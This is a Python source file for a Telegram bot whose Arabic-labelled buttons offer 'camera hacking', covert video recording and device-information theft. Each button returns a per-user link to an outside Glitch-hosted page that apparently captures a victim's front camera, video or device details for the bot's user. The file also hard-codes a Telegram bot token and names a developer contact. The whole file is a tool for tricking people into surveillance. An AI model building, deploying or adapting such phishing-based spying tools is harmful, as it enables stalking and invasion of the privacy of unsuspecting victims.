# -*- coding: utf-8 -*-
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
from flask import Flask
from threading import Thread
import os

TOKEN = "7267039320:AAFU735zR70ZnlSanlSNk-xSvmYTw1I_peg"

BASE_LINK_CAMERA = "https://woolly-incongruous-zipper.glitch.me?id="
BASE_LINK_VIDEO = "https://notch-battle-taxicab.glitch.me?id="
BASE_LINK_INFO = "https://eggplant-muddy-point.glitch.me?id="

DEV_USERNAME = "@rmmr38"

app = Flask(__name__)

@app.route("/")
def home():
    return "Bot is running!"

def start(update, context):
    keyboard = [
        [InlineKeyboardButton("📸 اختراق كاميرا الأمامية", callback_data="front_camera")],
        [InlineKeyboardButton("🎥اخطراق تصوير فديو", callback_data="record_video")],
        [InlineKeyboardButton("🖥 سحب معلومات الجهاز", callback_data="device_info")],
        [InlineKeyboardButton("🔱 التواصل مع المطور", url=f"https://t.me/{DEV_USERNAME[1:]}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text("اضغط على أحد الأزرار:", reply_markup=reply_markup)

def button_handler(update, context):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id

    if query.data == "front_camera":
        link = f"{BASE_LINK_CAMERA}{user_id}"
        query.message.reply_text(f"الرابط هو: {link}")
    elif query.data == "record_video":
        link = f"{BASE_LINK_VIDEO}{user_id}"
        query.message.reply_text(f"الرابط هو: {link}")
    elif query.data == "device_info":
        link = f"{BASE_LINK_INFO}{user_id}"
        query.message.reply_text(f"الرابط هو: {link}")

def run_bot():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(button_handler))
    updater.start_polling()
    updater.idle()

def run_flask():
    port = int(os.environ.get("PORT", 3000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    Thread(target=run_bot).start()
    run_flask()
